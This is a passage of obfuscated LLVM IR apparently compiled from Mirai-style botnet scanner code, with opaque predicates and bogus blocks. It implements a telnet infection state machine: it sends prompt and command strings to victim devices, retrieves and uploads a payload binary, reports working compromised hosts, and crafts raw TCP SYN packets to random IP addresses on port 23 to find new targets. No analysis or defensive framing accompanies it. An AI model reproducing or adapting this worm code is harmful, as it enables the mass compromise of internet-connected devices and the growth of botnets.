  %1766 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1765, i32 0, i32 1
  %1767 = load i32, i32* %1766, align 4
  %1768 = load i32, i32* @x.7
  %1769 = load i32, i32* @y.8
  %1770 = sub i32 %1768, 1
  %1771 = mul i32 %1768, %1770
  %1772 = urem i32 %1771, 2
  %1773 = icmp eq i32 %1772, 0
  %1774 = icmp slt i32 %1769, 10
  %1775 = or i1 %1773, %1774
  br i1 %1775, label %originalBBpart2247, label %originalBB245alteredBB

originalBBpart2247:                               ; preds = %originalBB245
  switch i32 %1767, label %1816 [
    i32 0, label %1776
    i32 1, label %1782
    i32 2, label %1791
  ]

; <label>:1776:                                   ; preds = %originalBBpart2247
  %1777 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1778 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1777, i32 0, i32 2
  %1779 = load i32, i32* %1778, align 8
  %1780 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1781 = call i32 (i32, i8*, ...) @fdsend(i32 %1779, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.119, i32 0, i32 0), i8* %1780)
  br label %1816

; <label>:1782:                                   ; preds = %originalBBpart2247
  %1783 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1784 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1783, i32 0, i32 2
  %1785 = load i32, i32* %1784, align 8
  %1786 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1787 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1786, i32 0, i32 8
  %1788 = getelementptr inbounds [16 x i8], [16 x i8]* %1787, i32 0, i32 0
  %1789 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1790 = call i32 (i32, i8*, ...) @fdsend(i32 %1785, i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.120, i32 0, i32 0), i32 176, i32 107, i32 133, i32 208, i8* %1788, i8* %1789)
  br label %1816

; <label>:1791:                                   ; preds = %originalBBpart2247
  %1792 = load i32, i32* @x.7
  %1793 = load i32, i32* @y.8
  %1794 = sub i32 %1792, 1
  %1795 = mul i32 %1792, %1794
  %1796 = urem i32 %1795, 2
  %1797 = icmp eq i32 %1796, 0
  %1798 = icmp slt i32 %1793, 10
  %1799 = or i1 %1797, %1798
  br i1 %1799, label %originalBB249, label %originalBB249alteredBB

originalBB249:                                    ; preds = %originalBB249alteredBB, %1791
  %1800 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1801 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1800, i32 0, i32 2
  %1802 = load i32, i32* %1801, align 8
  %1803 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1804 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1803, i32 0, i32 8
  %1805 = getelementptr inbounds [16 x i8], [16 x i8]* %1804, i32 0, i32 0
  %1806 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1807 = call i32 (i32, i8*, ...) @fdsend(i32 %1802, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.121, i32 0, i32 0), i8* %1805, i32 176, i32 107, i32 133, i32 208, i8* %1806)
  %1808 = load i32, i32* @x.7
  %1809 = load i32, i32* @y.8
  %1810 = sub i32 %1808, 1
  %1811 = mul i32 %1808, %1810
  %1812 = urem i32 %1811, 2
  %1813 = icmp eq i32 %1812, 0
  %1814 = icmp slt i32 %1809, 10
  %1815 = or i1 %1813, %1814
  br i1 %1815, label %originalBBpart2251, label %originalBB249alteredBB

originalBBpart2251:                               ; preds = %originalBB249
  br label %1816

; <label>:1816:                                   ; preds = %originalBBpart2251, %1782, %1776, %originalBBpart2247
  call void @table_lock_val(i8 zeroext 11)
  %1817 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1818 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1817, i32 0, i32 1
  %1819 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1818, i32 0, i32 1
  %1820 = load i32, i32* %1819, align 4
  %1821 = icmp ne i32 %1820, 0
  br i1 %1821, label %1822, label %1841

; <label>:1822:                                   ; preds = %1816
  %1823 = load i32, i32* @x.7
  %1824 = load i32, i32* @y.8
  %1825 = sub i32 %1823, 1
  %1826 = mul i32 %1823, %1825
  %1827 = urem i32 %1826, 2
  %1828 = icmp eq i32 %1827, 0
  %1829 = icmp slt i32 %1824, 10
  %1830 = or i1 %1828, %1829
  br i1 %1830, label %originalBB253, label %originalBB253alteredBB

originalBB253:                                    ; preds = %originalBB253alteredBB, %1822
  %1831 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1832 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1831, i32 0, i32 16
  store i32 13, i32* %1832, align 8
  %1833 = load i32, i32* @x.7
  %1834 = load i32, i32* @y.8
  %1835 = sub i32 %1833, 1
  %1836 = mul i32 %1833, %1835
  %1837 = urem i32 %1836, 2
  %1838 = icmp eq i32 %1837, 0
  %1839 = icmp slt i32 %1834, 10
  %1840 = or i1 %1838, %1839
  br i1 %1840, label %originalBBpart2255, label %originalBB253alteredBB

originalBBpart2255:                               ; preds = %originalBB253
  br label %1844

; <label>:1841:                                   ; preds = %1816
  %1842 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1843 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1842, i32 0, i32 16
  store i32 11, i32* %1843, align 8
  br label %1844

; <label>:1844:                                   ; preds = %1841, %originalBBpart2255
  %1845 = load i32, i32* @x.7
  %1846 = load i32, i32* @y.8
  %1847 = sub i32 %1845, 1
  %1848 = mul i32 %1845, %1847
  %1849 = urem i32 %1848, 2
  %1850 = icmp eq i32 %1849, 0
  %1851 = icmp slt i32 %1846, 10
  %1852 = or i1 %1850, %1851
  br i1 %1852, label %originalBB257, label %originalBB257alteredBB

originalBB257:                                    ; preds = %originalBB257alteredBB, %1844
  %1853 = load i32, i32* @x.7
  %1854 = load i32, i32* @y.8
  %1855 = sub i32 %1853, 1
  %1856 = mul i32 %1853, %1855
  %1857 = urem i32 %1856, 2
  %1858 = icmp eq i32 %1857, 0
  %1859 = icmp slt i32 %1854, 10
  %1860 = or i1 %1858, %1859
  br i1 %1860, label %originalBBpart2259, label %originalBB257alteredBB

originalBBpart2259:                               ; preds = %originalBB257
  br label %1861

; <label>:1861:                                   ; preds = %originalBBpart2259, %1750
  br label %2081

; <label>:1862:                                   ; preds = %1238
  %1863 = load i32, i32* @x.7
  %1864 = load i32, i32* @y.8
  %1865 = sub i32 %1863, 1
  %1866 = mul i32 %1863, %1865
  %1867 = urem i32 %1866, 2
  %1868 = icmp eq i32 %1867, 0
  %1869 = icmp slt i32 %1864, 10
  %1870 = or i1 %1868, %1869
  br i1 %1870, label %originalBB261, label %originalBB261alteredBB

originalBB261:                                    ; preds = %originalBB261alteredBB, %1862
  %1871 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1872 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1871)
  store i32 %1872, i32* %35, align 4
  %1873 = icmp sgt i32 %1872, 0
  %1874 = load i32, i32* @x.7
  %1875 = load i32, i32* @y.8
  %1876 = sub i32 %1874, 1
  %1877 = mul i32 %1874, %1876
  %1878 = urem i32 %1877, 2
  %1879 = icmp eq i32 %1878, 0
  %1880 = icmp slt i32 %1875, 10
  %1881 = or i1 %1879, %1880
  br i1 %1881, label %originalBBpart2263, label %originalBB261alteredBB

originalBBpart2263:                               ; preds = %originalBB261
  br i1 %1873, label %1882, label %1982

; <label>:1882:                                   ; preds = %originalBBpart2263
  %1883 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1884 = call %struct.payload* @get_retrieve_binary(%struct.scanner_connection* %1883)
  store %struct.payload* %1884, %struct.payload** %6, align 8
  %1885 = load %struct.payload*, %struct.payload** %6, align 8
  %1886 = icmp ne %struct.payload* %1885, null
  br i1 %1886, label %1905, label %1887

; <label>:1887:                                   ; preds = %1882
  %1888 = load i32, i32* @x.7
  %1889 = load i32, i32* @y.8
  %1890 = sub i32 %1888, 1
  %1891 = mul i32 %1888, %1890
  %1892 = urem i32 %1891, 2
  %1893 = icmp eq i32 %1892, 0
  %1894 = icmp slt i32 %1889, 10
  %1895 = or i1 %1893, %1894
  br i1 %1895, label %originalBB265, label %originalBB265alteredBB

originalBB265:                                    ; preds = %originalBB265alteredBB, %1887
  %1896 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1896, i32 1)
  %1897 = load i32, i32* @x.7
  %1898 = load i32, i32* @y.8
  %1899 = sub i32 %1897, 1
  %1900 = mul i32 %1897, %1899
  %1901 = urem i32 %1900, 2
  %1902 = icmp eq i32 %1901, 0
  %1903 = icmp slt i32 %1898, 10
  %1904 = or i1 %1902, %1903
  br i1 %1904, label %originalBBpart2267, label %originalBB265alteredBB

originalBBpart2267:                               ; preds = %originalBB265
  br label %2081

; <label>:1905:                                   ; preds = %1882
  %1906 = load %struct.payload*, %struct.payload** %6, align 8
  %1907 = call %struct.binary* @process_retrieve_binary(%struct.payload* %1906)
  store %struct.binary* %1907, %struct.binary** %7, align 8
  %1908 = load %struct.binary*, %struct.binary** %7, align 8
  %1909 = icmp ne %struct.binary* %1908, null
  br i1 %1909, label %1928, label %1910

; <label>:1910:                                   ; preds = %1905
  %1911 = load i32, i32* @x.7
  %1912 = load i32, i32* @y.8
  %1913 = sub i32 %1911, 1
  %1914 = mul i32 %1911, %1913
  %1915 = urem i32 %1914, 2
  %1916 = icmp eq i32 %1915, 0
  %1917 = icmp slt i32 %1912, 10
  %1918 = or i1 %1916, %1917
  br i1 %1918, label %originalBB269, label %originalBB269alteredBB

originalBB269:                                    ; preds = %originalBB269alteredBB, %1910
  %1919 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1919, i32 1)
  %1920 = load i32, i32* @x.7
  %1921 = load i32, i32* @y.8
  %1922 = sub i32 %1920, 1
  %1923 = mul i32 %1920, %1922
  %1924 = urem i32 %1923, 2
  %1925 = icmp eq i32 %1924, 0
  %1926 = icmp slt i32 %1921, 10
  %1927 = or i1 %1925, %1926
  br i1 %1927, label %originalBBpart2271, label %originalBB269alteredBB

originalBBpart2271:                               ; preds = %originalBB269
  br label %2081

; <label>:1928:                                   ; preds = %1905
  call void @table_unlock_val(i8 zeroext 11)
  %1929 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1930 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1929, i32 0, i32 2
  %1931 = load i32, i32* %1930, align 8
  %1932 = load %struct.binary*, %struct.binary** %7, align 8
  %1933 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1934 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1933, i32 0, i32 12
  %1935 = load i8, i8* %1934, align 1
  %1936 = zext i8 %1935 to i64
  %1937 = getelementptr inbounds %struct.binary, %struct.binary* %1932, i64 %1936
  %1938 = getelementptr inbounds %struct.binary, %struct.binary* %1937, i32 0, i32 0
  %1939 = load i8*, i8** %1938, align 8
  %1940 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1941 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1940, i32 0, i32 12
  %1942 = load i8, i8* %1941, align 1
  %1943 = zext i8 %1942 to i32
  %1944 = icmp eq i32 %1943, 0
  %1945 = select i1 %1944, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i32 0, i32 0)
  %1946 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1947 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1946, i32 0, i32 12
  %1948 = load i8, i8* %1947, align 1
  %1949 = zext i8 %1948 to i32
  %1950 = load %struct.binary*, %struct.binary** %7, align 8
  %1951 = getelementptr inbounds %struct.binary, %struct.binary* %1950, i32 0, i32 1
  %1952 = load i8, i8* %1951, align 8
  %1953 = zext i8 %1952 to i32
  %1954 = sub nsw i32 %1953, 1
  %1955 = icmp sge i32 %1949, %1954
  %1956 = select i1 %1955, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.126, i32 0, i32 0)
  %1957 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1958 = call i32 (i32, i8*, ...) @fdsend(i32 %1931, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.122, i32 0, i32 0), i8* %1939, i8* %1945, i8* %1956, i8* %1957)
  call void @table_lock_val(i8 zeroext 11)
  %1959 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1960 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1959, i32 0, i32 12
  %1961 = load i8, i8* %1960, align 1
  %1962 = zext i8 %1961 to i32
  %1963 = load %struct.binary*, %struct.binary** %7, align 8
  %1964 = getelementptr inbounds %struct.binary, %struct.binary* %1963, i32 0, i32 1
  %1965 = load i8, i8* %1964, align 8
  %1966 = zext i8 %1965 to i32
  %1967 = icmp slt i32 %1962, %1966
  br i1 %1967, label %1968, label %1977

; <label>:1968:                                   ; preds = %1928
  %1969 = load %struct.binary*, %struct.binary** %7, align 8
  %1970 = bitcast %struct.binary* %1969 to i8*
  call void @free(i8* %1970) #7
  %1971 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1972 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1971, i32 0, i32 12
  %1973 = load i8, i8* %1972, align 1
  %1974 = add i8 %1973, 1
  store i8 %1974, i8* %1972, align 1
  %1975 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1976 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1975, i32 0, i32 16
  store i32 11, i32* %1976, align 8
  br label %2081

; <label>:1977:                                   ; preds = %1928
  %1978 = load %struct.binary*, %struct.binary** %7, align 8
  %1979 = bitcast %struct.binary* %1978 to i8*
  call void @free(i8* %1979) #7
  %1980 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1981 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1980, i32 0, i32 16
  store i32 13, i32* %1981, align 8
  br label %1982

; <label>:1982:                                   ; preds = %1977, %originalBBpart2263
  br label %2081

; <label>:1983:                                   ; preds = %1238
  %1984 = load i32, i32* @x.7
  %1985 = load i32, i32* @y.8
  %1986 = sub i32 %1984, 1
  %1987 = mul i32 %1984, %1986
  %1988 = urem i32 %1987, 2
  %1989 = icmp eq i32 %1988, 0
  %1990 = icmp slt i32 %1985, 10
  %1991 = or i1 %1989, %1990
  br i1 %1991, label %originalBB273, label %originalBB273alteredBB

originalBB273:                                    ; preds = %originalBB273alteredBB, %1983
  %1992 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1993 = call i32 @consume_method_resonse(%struct.scanner_connection* %1992)
  store i32 %1993, i32* %35, align 4
  %1994 = icmp sgt i32 %1993, 0
  %1995 = load i32, i32* @x.7
  %1996 = load i32, i32* @y.8
  %1997 = sub i32 %1995, 1
  %1998 = mul i32 %1995, %1997
  %1999 = urem i32 %1998, 2
  %2000 = icmp eq i32 %1999, 0
  %2001 = icmp slt i32 %1996, 10
  %2002 = or i1 %2000, %2001
  br i1 %2002, label %originalBBpart2275, label %originalBB273alteredBB

originalBBpart2275:                               ; preds = %originalBB273
  br i1 %1994, label %2003, label %2029

; <label>:2003:                                   ; preds = %originalBBpart2275
  %2004 = load i32, i32* @x.7
  %2005 = load i32, i32* @y.8
  %2006 = sub i32 %2004, 1
  %2007 = mul i32 %2004, %2006
  %2008 = urem i32 %2007, 2
  %2009 = icmp eq i32 %2008, 0
  %2010 = icmp slt i32 %2005, 10
  %2011 = or i1 %2009, %2010
  br i1 %2011, label %originalBB277, label %originalBB277alteredBB

originalBB277:                                    ; preds = %originalBB277alteredBB, %2003
  %2012 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2013 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2012, i32 0, i32 15
  %2014 = load i32, i32* %2013, align 4
  %2015 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2016 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2015, i32 0, i32 13
  %2017 = load i16, i16* %2016, align 8
  %2018 = zext i16 %2017 to i32
  %2019 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %2014, i32 %2018, %struct.scanner_connection* %2019, i32 1)
  %2020 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2020, i32 1)
  %2021 = load i32, i32* @x.7
  %2022 = load i32, i32* @y.8
  %2023 = sub i32 %2021, 1
  %2024 = mul i32 %2021, %2023
  %2025 = urem i32 %2024, 2
  %2026 = icmp eq i32 %2025, 0
  %2027 = icmp slt i32 %2022, 10
  %2028 = or i1 %2026, %2027
  br i1 %2028, label %originalBBpart2279, label %originalBB277alteredBB

originalBBpart2279:                               ; preds = %originalBB277
  br label %2079

; <label>:2029:                                   ; preds = %originalBBpart2275
  %2030 = load i32, i32* %35, align 4
  %2031 = icmp eq i32 %2030, -1
  br i1 %2031, label %2032, label %2072

; <label>:2032:                                   ; preds = %2029
  %2033 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2034 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2033, i32 0, i32 16
  %2035 = load i32, i32* %2034, align 8
  %2036 = icmp eq i32 %2035, 11
  br i1 %2036, label %2043, label %2037

; <label>:2037:                                   ; preds = %2032
  %2038 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2039 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2038, i32 0, i32 1
  %2040 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %2039, i32 0, i32 1
  %2041 = load i32, i32* %2040, align 4
  %2042 = icmp eq i32 %2041, 0
  br i1 %2042, label %2043, label %2061

; <label>:2043:                                   ; preds = %2037, %2032
  %2044 = load i32, i32* @x.7
  %2045 = load i32, i32* @y.8
  %2046 = sub i32 %2044, 1
  %2047 = mul i32 %2044, %2046
  %2048 = urem i32 %2047, 2
  %2049 = icmp eq i32 %2048, 0
  %2050 = icmp slt i32 %2045, 10
  %2051 = or i1 %2049, %2050
  br i1 %2051, label %originalBB281, label %originalBB281alteredBB

originalBB281:                                    ; preds = %originalBB281alteredBB, %2043
  %2052 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2052, i32 1)
  %2053 = load i32, i32* @x.7
  %2054 = load i32, i32* @y.8
  %2055 = sub i32 %2053, 1
  %2056 = mul i32 %2053, %2055
  %2057 = urem i32 %2056, 2
  %2058 = icmp eq i32 %2057, 0
  %2059 = icmp slt i32 %2054, 10
  %2060 = or i1 %2058, %2059
  br i1 %2060, label %originalBBpart2283, label %originalBB281alteredBB

originalBBpart2283:                               ; preds = %originalBB281
  br label %2081

; <label>:2061:                                   ; preds = %2037
  %2062 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2063 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2062, i32 0, i32 1
  %2064 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %2063, i32 0, i32 1
  store i32 0, i32* %2064, align 4
  %2065 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2066 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2065, i32 0, i32 16
  store i32 11, i32* %2066, align 8
  call void @table_unlock_val(i8 zeroext 11)
  %2067 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2068 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2067, i32 0, i32 2
  %2069 = load i32, i32* %2068, align 8
  %2070 = call i8* @table_retrieve_val(i32 11, i32* null)
  %2071 = call i32 (i32, i8*, ...) @fdsend(i32 %2069, i8* %2070)
  call void @table_lock_val(i8 zeroext 11)
  br label %2081

; <label>:2072:                                   ; preds = %2029
  %2073 = load i32, i32* %35, align 4
  %2074 = icmp eq i32 %2073, -2
  br i1 %2074, label %2075, label %2077

; <label>:2075:                                   ; preds = %2072
  %2076 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2076, i32 1)
  br label %2081

; <label>:2077:                                   ; preds = %2072
  br label %2078

; <label>:2078:                                   ; preds = %2077
  br label %2079

; <label>:2079:                                   ; preds = %2078, %originalBBpart2279
  br label %2081

; <label>:2080:                                   ; preds = %1238
  store i32 0, i32* %35, align 4
  br label %2081

; <label>:2081:                                   ; preds = %2080, %2079, %2075, %2061, %originalBBpart2283, %1982, %1968, %originalBBpart2271, %originalBBpart2267, %1861, %1749, %1730, %1703, %1642, %originalBBpart2231, %originalBBpart2219, %originalBBpart2215, %originalBBpart2206, %originalBBpart2190, %1298, %1265
  %2082 = load i32, i32* %35, align 4
  %2083 = icmp eq i32 %2082, 0
  br i1 %2083, label %2084, label %2085

; <label>:2084:                                   ; preds = %2081
  br label %2138

; <label>:2085:                                   ; preds = %2081
  %2086 = load i32, i32* %35, align 4
  %2087 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2088 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2087, i32 0, i32 4
  %2089 = load i32, i32* %2088, align 8
  %2090 = icmp sgt i32 %2086, %2089
  br i1 %2090, label %2091, label %2095

; <label>:2091:                                   ; preds = %2085
  %2092 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2093 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2092, i32 0, i32 4
  %2094 = load i32, i32* %2093, align 8
  store i32 %2094, i32* %35, align 4
  br label %2095

; <label>:2095:                                   ; preds = %2091, %2085
  %2096 = load i32, i32* @x.7
  %2097 = load i32, i32* @y.8
  %2098 = sub i32 %2096, 1
  %2099 = mul i32 %2096, %2098
  %2100 = urem i32 %2099, 2
  %2101 = icmp eq i32 %2100, 0
  %2102 = icmp slt i32 %2097, 10
  %2103 = or i1 %2101, %2102
  br i1 %2103, label %originalBB285, label %originalBB285alteredBB

originalBB285:                                    ; preds = %originalBB285alteredBB, %2095
  %2104 = load i32, i32* %35, align 4
  %2105 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2106 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2105, i32 0, i32 4
  %2107 = load i32, i32* %2106, align 8
  %2108 = sub nsw i32 %2107, %2104
  store i32 %2108, i32* %2106, align 8
  %2109 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2110 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2109, i32 0, i32 7
  %2111 = getelementptr inbounds [8192 x i8], [8192 x i8]* %2110, i32 0, i32 0
  %2112 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2112, i32 0, i32 7
  %2114 = getelementptr inbounds [8192 x i8], [8192 x i8]* %2113, i32 0, i32 0
  %2115 = load i32, i32* %35, align 4
  %2116 = sext i32 %2115 to i64
  %2117 = getelementptr inbounds i8, i8* %2114, i64 %2116
  %2118 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2119 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2118, i32 0, i32 4
  %2120 = load i32, i32* %2119, align 8
  %2121 = sext i32 %2120 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2111, i8* %2117, i64 %2121, i32 1, i1 false)
  %2122 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2123 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2122, i32 0, i32 7
  %2124 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2124, i32 0, i32 4
  %2126 = load i32, i32* %2125, align 8
  %2127 = sext i32 %2126 to i64
  %2128 = getelementptr inbounds [8192 x i8], [8192 x i8]* %2123, i64 0, i64 %2127
  store i8 0, i8* %2128, align 1
  %2129 = load i32, i32* @x.7
  %2130 = load i32, i32* @y.8
  %2131 = sub i32 %2129, 1
  %2132 = mul i32 %2129, %2131
  %2133 = urem i32 %2132, 2
  %2134 = icmp eq i32 %2133, 0
  %2135 = icmp slt i32 %2130, 10
  %2136 = or i1 %2134, %2135
  br i1 %2136, label %originalBBpart2299, label %originalBB285alteredBB

originalBBpart2299:                               ; preds = %originalBB285
  br label %2137

; <label>:2137:                                   ; preds = %originalBBpart2299
  br label %1238

; <label>:2138:                                   ; preds = %2084
  br label %1074

; <label>:2139:                                   ; preds = %1212, %1079
  br label %2140

; <label>:2140:                                   ; preds = %2139, %originalBBpart2138
  br label %2141

; <label>:2141:                                   ; preds = %2140, %998, %972
  %2142 = load i32, i32* %1, align 4
  %2143 = add nsw i32 %2142, 1
  store i32 %2143, i32* %1, align 4
  br label %960

; <label>:2144:                                   ; preds = %960
  br label %230

originalBBalteredBB:                              ; preds = %originalBB, %50
  %2145 = load i32, i32* %1, align 4
  %2146 = icmp slt i32 %2145, 628
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %90
  %2147 = load i32, i32* %1, align 4
  %_ = shl i32 %2147, 1
  %_2 = sub i32 0, %2147
  %gen = add i32 %_2, 1
  %2148 = add nsw i32 %2147, 1
  store i32 %2148, i32* %1, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %112
  call void @exit(i32 0) #8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %142
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %159
  %2149 = call i32 @rand_next()
  %_15 = shl i32 %2149, 65535
  %_16 = sub i32 %2149, 65535
  %gen17 = mul i32 %_16, 65535
  %2150 = and i32 %2149, 65535
  %2151 = trunc i32 %2150 to i16
  store i16 %2151, i16* %2, align 2
  br label %originalBB14

originalBB21alteredBB:                            ; preds = %originalBB21, %230
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %2152 = load i32, i32* @fake_time, align 4
  %2153 = load i32, i32* %13, align 4
  %2154 = icmp ne i32 %2152, %2153
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %250
  %2155 = load i32, i32* @fake_time, align 4
  store i32 %2155, i32* %13, align 4
  store i32 0, i32* %1, align 4
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %268
  %2156 = load i32, i32* %1, align 4
  %2157 = icmp slt i32 %2156, 760
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %287
  %2158 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %2158, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %18, align 8
  %2159 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2159, i64 1
  %2161 = bitcast %struct.iphdr* %2160 to %struct.tcphdr*
  store %struct.tcphdr* %2161, %struct.tcphdr** %19, align 8
  %2162 = call i32 @rand_next()
  %2163 = trunc i32 %2162 to i16
  %2164 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2164, i32 0, i32 3
  store i16 %2163, i16* %2165, align 4
  %2166 = load i32, i32* @LOCAL_ADDR, align 4
  %2167 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2167, i32 0, i32 8
  store i32 %2166, i32* %2168, align 4
  %2169 = call i32 @get_random_ip()
  %2170 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2170, i32 0, i32 9
  store i32 %2169, i32* %2171, align 4
  %2172 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2172, i32 0, i32 7
  store i16 0, i16* %2173, align 2
  %2174 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2175 = bitcast %struct.iphdr* %2174 to i16*
  %2176 = call zeroext i16 @checksum_generic(i16* %2175, i32 20)
  %2177 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2177, i32 0, i32 7
  store i16 %2176, i16* %2178, align 2
  %2179 = call zeroext i16 @htons(i16 zeroext 23) #9
  %2180 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %2181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2180, i32 0, i32 1
  store i16 %2179, i16* %2181, align 2
  %2182 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2182, i32 0, i32 9
  %2184 = load i32, i32* %2183, align 4
  %2185 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %2186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2185, i32 0, i32 2
  store i32 %2184, i32* %2186, align 4
  %2187 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
